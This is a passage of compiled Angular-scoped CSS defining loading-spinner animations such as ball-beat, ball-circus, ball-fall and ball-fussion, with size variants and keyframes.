      -webkit-animation: ball-beat .7s linear -.15s infinite;
      animation: ball-beat .7s linear -.15s infinite
    }

    .la-ball-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2n-1) {
      -webkit-animation-delay: -.5s;
      animation-delay: -.5s
    }

    .la-ball-beat.la-sm[_ngcontent-oeb-c134] {
      width: 26px;
      height: 8px
    }

    .la-ball-beat.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin: 2px
    }

    .la-ball-beat.la-2x[_ngcontent-oeb-c134] {
      width: 108px;
      height: 36px
    }

    .la-ball-beat.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 20px;
      height: 20px;
      margin: 8px
    }

    .la-ball-beat.la-3x[_ngcontent-oeb-c134] {
      width: 162px;
      height: 54px
    }

    .la-ball-beat.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 30px;
      height: 30px;
      margin: 12px
    }

    @-webkit-keyframes ball-beat {
      50% {
        opacity: .2;
        transform: scale(.75)
      }

      to {
        opacity: 1;
        transform: scale(1)
      }
    }

    @keyframes ball-beat {
      50% {
        opacity: .2;
        transform: scale(.75)
      }

      to {
        opacity: 1;
        transform: scale(1)
      }
    }

    .la-ball-circus[_ngcontent-oeb-c134],
    .la-ball-circus[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-circus[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-circus.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-circus[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-circus[_ngcontent-oeb-c134],
    .la-ball-circus[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-circus[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 0;
      left: -100%;
      display: block;
      width: 100%;
      height: 100%;
      border-radius: 100%;
      opacity: .5;
      -webkit-animation: ball-circus-position 2.5s cubic-bezier(.25, 0, .75, 1) infinite, ball-circus-size 2.5s cubic-bezier(.25, 0, .75, 1) infinite;
      animation: ball-circus-position 2.5s cubic-bezier(.25, 0, .75, 1) infinite, ball-circus-size 2.5s cubic-bezier(.25, 0, .75, 1) infinite
    }

    .la-ball-circus[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      -webkit-animation-delay: 0s, -.5s;
      animation-delay: 0s, -.5s
    }

    .la-ball-circus[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation-delay: -.5s, -1s;
      animation-delay: -.5s, -1s
    }

    .la-ball-circus[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-delay: -1s, -1.5s;
      animation-delay: -1s, -1.5s
    }

    .la-ball-circus[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      -webkit-animation-delay: -1.5s, -2s;
      animation-delay: -1.5s, -2s
    }

    .la-ball-circus[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      -webkit-animation-delay: -2s, -2.5s;
      animation-delay: -2s, -2.5s
    }

    .la-ball-circus.la-sm[_ngcontent-oeb-c134],
    .la-ball-circus.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 8px;
      height: 8px
    }

    .la-ball-circus.la-2x[_ngcontent-oeb-c134],
    .la-ball-circus.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-ball-circus.la-3x[_ngcontent-oeb-c134],
    .la-ball-circus.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 48px;
      height: 48px
    }

    @-webkit-keyframes ball-circus-position {
      50% {
        left: 100%
      }
    }

    @keyframes ball-circus-position {
      50% {
        left: 100%
      }
    }

    @-webkit-keyframes ball-circus-size {
      50% {
        transform: scale(.3)
      }
    }

    @keyframes ball-circus-size {
      50% {
        transform: scale(.3)
      }
    }

    .la-ball-climbing-dot[_ngcontent-oeb-c134],
    .la-ball-climbing-dot[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-climbing-dot[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-climbing-dot.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-climbing-dot[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-climbing-dot[_ngcontent-oeb-c134] {
      width: 42px;
      height: 32px
    }

    .la-ball-climbing-dot[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      position: absolute;
      bottom: 32%;
      left: 18%;
      width: 14px;
      height: 14px;
      border-radius: 100%;
      transform-origin: center bottom;
      -webkit-animation: ball-climbing-dot-jump .6s ease-in-out infinite;
      animation: ball-climbing-dot-jump .6s ease-in-out infinite
    }

    .la-ball-climbing-dot[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:not(:first-child) {
      position: absolute;
      top: 0;
      right: 0;
      width: 14px;
      height: 2px;
      border-radius: 0;
      transform: translate(60%);
      -webkit-animation: ball-climbing-dot-steps 1.8s linear infinite;
      animation: ball-climbing-dot-steps 1.8s linear infinite
    }

    .la-ball-climbing-dot[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:not(:first-child):nth-child(2) {
      -webkit-animation-delay: 0ms;
      animation-delay: 0ms
    }

    .la-ball-climbing-dot[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:not(:first-child):nth-child(3) {
      -webkit-animation-delay: -.6s;
      animation-delay: -.6s
    }

    .la-ball-climbing-dot[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:not(:first-child):nth-child(4) {
      -webkit-animation-delay: -1.2s;
      animation-delay: -1.2s
    }

    .la-ball-climbing-dot.la-sm[_ngcontent-oeb-c134] {
      width: 20px;
      height: 16px
    }

    .la-ball-climbing-dot.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      width: 6px;
      height: 6px
    }

    .la-ball-climbing-dot.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:not(:first-child) {
      width: 6px;
      height: 1px
    }

    .la-ball-climbing-dot.la-2x[_ngcontent-oeb-c134] {
      width: 84px;
      height: 64px
    }

    .la-ball-climbing-dot.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      width: 28px;
      height: 28px
    }

    .la-ball-climbing-dot.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:not(:first-child) {
      width: 28px;
      height: 4px
    }

    .la-ball-climbing-dot.la-3x[_ngcontent-oeb-c134] {
      width: 126px;
      height: 96px
    }

    .la-ball-climbing-dot.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      width: 42px;
      height: 42px
    }

    .la-ball-climbing-dot.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:not(:first-child) {
      width: 42px;
      height: 6px
    }

    @-webkit-keyframes ball-climbing-dot-jump {
      0% {
        transform: scaleY(.7)
      }

      20% {
        transform: scale(.7, 1.2)
      }

      40% {
        transform: scale(1)
      }

      50% {
        bottom: 125%
      }

      46% {
        transform: scale(1)
      }

      80% {
        transform: scale(.7, 1.2)
      }

      90% {
        transform: scale(.7, 1.2)
      }

      to {
        transform: scaleY(.7)
      }
    }

    @keyframes ball-climbing-dot-jump {
      0% {
        transform: scaleY(.7)
      }

      20% {
        transform: scale(.7, 1.2)
      }

      40% {
        transform: scale(1)
      }

      50% {
        bottom: 125%
      }

      46% {
        transform: scale(1)
      }

      80% {
        transform: scale(.7, 1.2)
      }

      90% {
        transform: scale(.7, 1.2)
      }

      to {
        transform: scaleY(.7)
      }
    }

    @-webkit-keyframes ball-climbing-dot-steps {
      0% {
        top: 0;
        right: 0;
        opacity: 0
      }

      50% {
        opacity: 1
      }

      to {
        top: 100%;
        right: 100%;
        opacity: 0
      }
    }

    @keyframes ball-climbing-dot-steps {
      0% {
        top: 0;
        right: 0;
        opacity: 0
      }

      50% {
        opacity: 1
      }

      to {
        top: 100%;
        right: 100%;
        opacity: 0
      }
    }

    .la-ball-clip-rotate-multiple[_ngcontent-oeb-c134],
    .la-ball-clip-rotate-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-clip-rotate-multiple[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-clip-rotate-multiple.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-clip-rotate-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-clip-rotate-multiple[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-ball-clip-rotate-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 50%;
      left: 50%;
      background: transparent;
      border-style: solid;
      border-width: 2px;
      border-radius: 100%;
      -webkit-animation: ball-clip-rotate-multiple-rotate 1s ease-in-out infinite;
      animation: ball-clip-rotate-multiple-rotate 1s ease-in-out infinite
    }

    .la-ball-clip-rotate-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      position: absolute;
      width: 32px;
      height: 32px;
      border-right-color: transparent;
      border-left-color: transparent
    }

    .la-ball-clip-rotate-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:last-child {
      width: 16px;
      height: 16px;
      border-top-color: transparent;
      border-bottom-color: transparent;
      -webkit-animation-duration: .5s;
      animation-duration: .5s;
      -webkit-animation-direction: reverse;
      animation-direction: reverse
    }

    .la-ball-clip-rotate-multiple.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-clip-rotate-multiple.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      border-width: 1px
    }

    .la-ball-clip-rotate-multiple.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      width: 16px;
      height: 16px
    }

    .la-ball-clip-rotate-multiple.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:last-child {
      width: 8px;
      height: 8px
    }

    .la-ball-clip-rotate-multiple.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-clip-rotate-multiple.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      border-width: 4px
    }

    .la-ball-clip-rotate-multiple.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      width: 64px;
      height: 64px
    }

    .la-ball-clip-rotate-multiple.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:last-child {
      width: 32px;
      height: 32px
    }

    .la-ball-clip-rotate-multiple.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-ball-clip-rotate-multiple.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      border-width: 6px
    }

    .la-ball-clip-rotate-multiple.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      width: 96px;
      height: 96px
    }

    .la-ball-clip-rotate-multiple.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:last-child {
      width: 48px;
      height: 48px
    }

    @-webkit-keyframes ball-clip-rotate-multiple-rotate {
      0% {
        transform: translate(-50%, -50%) rotate(0deg)
      }

      50% {
        transform: translate(-50%, -50%) rotate(180deg)
      }

      to {
        transform: translate(-50%, -50%) rotate(1turn)
      }
    }

    @keyframes ball-clip-rotate-multiple-rotate {
      0% {
        transform: translate(-50%, -50%) rotate(0deg)
      }

      50% {
        transform: translate(-50%, -50%) rotate(180deg)
      }

      to {
        transform: translate(-50%, -50%) rotate(1turn)
      }
    }

    .la-ball-clip-rotate-pulse[_ngcontent-oeb-c134],
    .la-ball-clip-rotate-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-clip-rotate-pulse[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-clip-rotate-pulse.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-clip-rotate-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-clip-rotate-pulse[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-ball-clip-rotate-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 50%;
      left: 50%;
      border-radius: 100%
    }

    .la-ball-clip-rotate-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      position: absolute;
      width: 32px;
      height: 32px;
      background: transparent;
      border-bottom-style: solid;
      border-top-style: solid;
      border-bottom-width: 2px;
      border-top-width: 2px;
      border-right: 2px solid transparent;
      border-left: 2px solid transparent;
      -webkit-animation: ball-clip-rotate-pulse-rotate 1s cubic-bezier(.09, .57, .49, .9) infinite;
      animation: ball-clip-rotate-pulse-rotate 1s cubic-bezier(.09, .57, .49, .9) infinite
    }

    .la-ball-clip-rotate-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:last-child {
      width: 16px;
      height: 16px;
      -webkit-animation: ball-clip-rotate-pulse-scale 1s cubic-bezier(.09, .57, .49, .9) infinite;
      animation: ball-clip-rotate-pulse-scale 1s cubic-bezier(.09, .57, .49, .9) infinite
    }

    .la-ball-clip-rotate-pulse.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-clip-rotate-pulse.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      width: 16px;
      height: 16px;
      border-width: 1px
    }

    .la-ball-clip-rotate-pulse.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:last-child {
      width: 8px;
      height: 8px
    }

    .la-ball-clip-rotate-pulse.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-clip-rotate-pulse.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      width: 64px;
      height: 64px;
      border-width: 4px
    }

    .la-ball-clip-rotate-pulse.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:last-child {
      width: 32px;
      height: 32px
    }

    .la-ball-clip-rotate-pulse.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-ball-clip-rotate-pulse.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      width: 96px;
      height: 96px;
      border-width: 6px
    }

    .la-ball-clip-rotate-pulse.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:last-child {
      width: 48px;
      height: 48px
    }

    @-webkit-keyframes ball-clip-rotate-pulse-rotate {
      0% {
        transform: translate(-50%, -50%) rotate(0deg)
      }

      50% {
        transform: translate(-50%, -50%) rotate(180deg)
      }

      to {
        transform: translate(-50%, -50%) rotate(1turn)
      }
    }

    @keyframes ball-clip-rotate-pulse-rotate {
      0% {
        transform: translate(-50%, -50%) rotate(0deg)
      }

      50% {
        transform: translate(-50%, -50%) rotate(180deg)
      }

      to {
        transform: translate(-50%, -50%) rotate(1turn)
      }
    }

    @-webkit-keyframes ball-clip-rotate-pulse-scale {

      0%,
      to {
        opacity: 1;
        transform: translate(-50%, -50%) scale(1)
      }

      30% {
        opacity: .3;
        transform: translate(-50%, -50%) scale(.15)
      }
    }

    @keyframes ball-clip-rotate-pulse-scale {

      0%,
      to {
        opacity: 1;
        transform: translate(-50%, -50%) scale(1)
      }

      30% {
        opacity: .3;
        transform: translate(-50%, -50%) scale(.15)
      }
    }

    .la-ball-clip-rotate[_ngcontent-oeb-c134],
    .la-ball-clip-rotate[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-clip-rotate[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-clip-rotate.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-clip-rotate[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-clip-rotate[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-ball-clip-rotate[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px;
      background: transparent;
      border-width: 2px;
      border-bottom-color: transparent;
      border-radius: 100%;
      -webkit-animation: ball-clip-rotate .75s linear infinite;
      animation: ball-clip-rotate .75s linear infinite
    }

    .la-ball-clip-rotate.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-clip-rotate.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px;
      border-width: 1px
    }

    .la-ball-clip-rotate.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-clip-rotate.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px;
      border-width: 4px
    }

    .la-ball-clip-rotate.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-ball-clip-rotate.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px;
      border-width: 6px
    }

    @-webkit-keyframes ball-clip-rotate {
      0% {
        transform: rotate(0deg)
      }

      50% {
        transform: rotate(180deg)
      }

      to {
        transform: rotate(1turn)
      }
    }

    @keyframes ball-clip-rotate {
      0% {
        transform: rotate(0deg)
      }

      50% {
        transform: rotate(180deg)
      }

      to {
        transform: rotate(1turn)
      }
    }

    .la-ball-elastic-dots[_ngcontent-oeb-c134],
    .la-ball-elastic-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-elastic-dots[_ngcontent-oeb-c134] {
      display: block;
      color: #fff
    }

    .la-ball-elastic-dots.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-elastic-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-elastic-dots[_ngcontent-oeb-c134] {
      width: 120px;
      height: 10px;
      font-size: 0;
      text-align: center
    }

    .la-ball-elastic-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      width: 10px;
      height: 10px;
      white-space: nowrap;
      border-radius: 100%;
      -webkit-animation: ball-elastic-dots-anim 1s infinite;
      animation: ball-elastic-dots-anim 1s infinite
    }

    .la-ball-elastic-dots.la-sm[_ngcontent-oeb-c134] {
      width: 60px;
      height: 4px
    }

    .la-ball-elastic-dots.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px
    }

    .la-ball-elastic-dots.la-2x[_ngcontent-oeb-c134] {
      width: 240px;
      height: 20px
    }

    .la-ball-elastic-dots.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 20px;
      height: 20px
    }

    .la-ball-elastic-dots.la-3x[_ngcontent-oeb-c134] {
      width: 360px;
      height: 30px
    }

    .la-ball-elastic-dots.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 30px;
      height: 30px
    }

    @-webkit-keyframes ball-elastic-dots-anim {

      0%,
      to {
        margin: 0;
        transform: scale(1)
      }

      50% {
        margin: 0 5%;
        transform: scale(.65)
      }
    }

    @keyframes ball-elastic-dots-anim {

      0%,
      to {
        margin: 0;
        transform: scale(1)
      }

      50% {
        margin: 0 5%;
        transform: scale(.65)
      }
    }

    .la-ball-fall[_ngcontent-oeb-c134],
    .la-ball-fall[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-fall[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-fall.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-fall[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-fall[_ngcontent-oeb-c134] {
      width: 54px;
      height: 18px
    }

    .la-ball-fall[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 10px;
      height: 10px;
      margin: 4px;
      border-radius: 100%;
      opacity: 0;
      -webkit-animation: ball-fall 1s ease-in-out infinite;
      animation: ball-fall 1s ease-in-out infinite
    }

    .la-ball-fall[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      -webkit-animation-delay: -.2s;
      animation-delay: -.2s
    }

    .la-ball-fall[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation-delay: -.1s;
      animation-delay: -.1s
    }

    .la-ball-fall[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-delay: 0ms;
      animation-delay: 0ms
    }

    .la-ball-fall.la-sm[_ngcontent-oeb-c134] {
      width: 26px;
      height: 8px
    }

    .la-ball-fall.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin: 2px
    }

    .la-ball-fall.la-2x[_ngcontent-oeb-c134] {
      width: 108px;
      height: 36px
    }

    .la-ball-fall.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 20px;
      height: 20px;
      margin: 8px
    }

    .la-ball-fall.la-3x[_ngcontent-oeb-c134] {
      width: 162px;
      height: 54px
    }

    .la-ball-fall.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 30px;
      height: 30px;
      margin: 12px
    }

    @-webkit-keyframes ball-fall {
      0% {
        opacity: 0;
        transform: translateY(-145%)
      }

      10% {
        opacity: .5
      }

      20% {
        opacity: 1;
        transform: translateY(0)
      }

      80% {
        opacity: 1;
        transform: translateY(0)
      }

      90% {
        opacity: .5
      }

      to {
        opacity: 0;
        transform: translateY(145%)
      }
    }

    @keyframes ball-fall {
      0% {
        opacity: 0;
        transform: translateY(-145%)
      }

      10% {
        opacity: .5
      }

      20% {
        opacity: 1;
        transform: translateY(0)
      }

      80% {
        opacity: 1;
        transform: translateY(0)
      }

      90% {
        opacity: .5
      }

      to {
        opacity: 0;
        transform: translateY(145%)
      }
    }

    .la-ball-fussion[_ngcontent-oeb-c134],
    .la-ball-fussion[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-fussion[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-fussion.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-fussion[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-fussion[_ngcontent-oeb-c134] {
      width: 8px;
      height: 8px
    }

    .la-ball-fussion[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      width: 12px;
      height: 12px;
      border-radius: 100%;
      transform: translate(-50%, -50%);
      -webkit-animation: ball-fussion-ball1 1s ease 0s infinite;
      animation: ball-fussion-ball1 1s ease 0s infinite
    }

    .la-ball-fussion[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      top: 0;
      left: 50%;
      z-index: 1
    }

    .la-ball-fussion[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 50%;
      left: 100%;
      z-index: 2;
      -webkit-animation-name: ball-fussion-ball2;
      animation-name: ball-fussion-ball2
    }

    .la-ball-fussion[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      top: 100%;
      left: 50%;
      z-index: 1;
      -webkit-animation-name: ball-fussion-ball3;
      animation-name: ball-fussion-ball3
    }

    .la-ball-fussion[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      top: 50%;
      left: 0;
      z-index: 2;
      -webkit-animation-name: ball-fussion-ball4;
      animation-name: ball-fussion-ball4
    }

    .la-ball-fussion.la-sm[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px
    }

    .la-ball-fussion.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 6px;
      height: 6px
    }

    .la-ball-fussion.la-2x[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-fussion.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134],
    .la-ball-fussion.la-3x[_ngcontent-oeb-c134] {
      width: 24px;
      height: 24px
    }

    .la-ball-fussion.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 36px;
      height: 36px
    }

    @-webkit-keyframes ball-fussion-ball1 {
      0% {
        opacity: .35
      }

      50% {
        top: -100%;
        left: 200%;
        opacity: 1
      }

      to {
        top: 50%;
        left: 100%;
        z-index: 2;
        opacity: .35
      }
    }

    @keyframes ball-fussion-ball1 {
      0% {
        opacity: .35
      }

      50% {
        top: -100%;
        left: 200%;
        opacity: 1
      }

      to {
        top: 50%;
        left: 100%;
        z-index: 2;
        opacity: .35
      }
    }

    @-webkit-keyframes ball-fussion-ball2 {
      0% {
        opacity: .35
      }

      50% {
        top: 200%;
        left: 200%;
        opacity: 1
      }

      to {
        top: 100%;
        left: 50%;
        z-index: 1;
        opacity: .35
      }
    }

    @keyframes ball-fussion-ball2 {
      0% {
        opacity: .35
      }

      50% {
        top: 200%;
        left: 200%;
        opacity: 1
      }

      to {
        top: 100%;
        left: 50%;
        z-index: 1;
        opacity: .35
      }
    }

    @-webkit-keyframes ball-fussion-ball3 {
      0% {
        opacity: .35
      }

      50% {
        top: 200%;
        left: -100%;
        opacity: 1
      }

      to {
        top: 50%;
        left: 0;
        z-index: 2;
        opacity: .35
      }
    }

    @keyframes ball-fussion-ball3 {
      0% {
        opacity: .35
      }

      50% {
        top: 200%;
        left: -100%;
        opacity: 1
      }

      to {
        top: 50%;
        left: 0;
        z-index: 2;
        opacity: .35
      }
    }

    @-webkit-keyframes ball-fussion-ball4 {
      0% {
        opacity: .35
      }

      50% {
        top: -100%;
        left: -100%;
        opacity: 1
      }

      to {
        top: 0;
        left: 50%;
        z-index: 1;
        opacity: .35
      }
    }

    @keyframes ball-fussion-ball4 {
      0% {
        opacity: .35
      }

      50% {
        top: -100%;
        left: -100%;
        opacity: 1
      }

      to {
        top: 0;
        left: 50%;
        z-index: 1;
        opacity: .35
      }
    }

    .la-ball-grid-beat[_ngcontent-oeb-c134],
    .la-ball-grid-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-grid-beat[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-grid-beat.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-grid-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-grid-beat[_ngcontent-oeb-c134] {
      width: 36px;
      height: 36px
    }

    .la-ball-grid-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 8px;
      height: 8px;
      margin: 2px;
      border-radius: 100%;
      -webkit-animation-name: ball-grid-beat;
      animation-name: ball-grid-beat;
      -webkit-animation-iteration-count: infinite;
      animation-iteration-count: infinite
    }

    .la-ball-grid-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      -webkit-animation-duration: .65s;
      animation-duration: .65s;
      -webkit-animation-delay: .03s;
      animation-delay: .03s
    }

    .la-ball-grid-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation-duration: 1.02s;
      animation-duration: 1.02s;
      -webkit-animation-delay: .09s;
      animation-delay: .09s
    }

    .la-ball-grid-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-duration: 1.06s;
      animation-duration: 1.06s;
      -webkit-animation-delay: -.69s;
      animation-delay: -.69s
    }

    .la-ball-grid-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      -webkit-animation-duration: 1.5s;
      animation-duration: 1.5s;
      -webkit-animation-delay: -.41s;
      animation-delay: -.41s
    }

    .la-ball-grid-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      -webkit-animation-duration: 1.6s;
      animation-duration: 1.6s;
      -webkit-animation-delay: .04s;
      animation-delay: .04s
    }

    .la-ball-grid-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
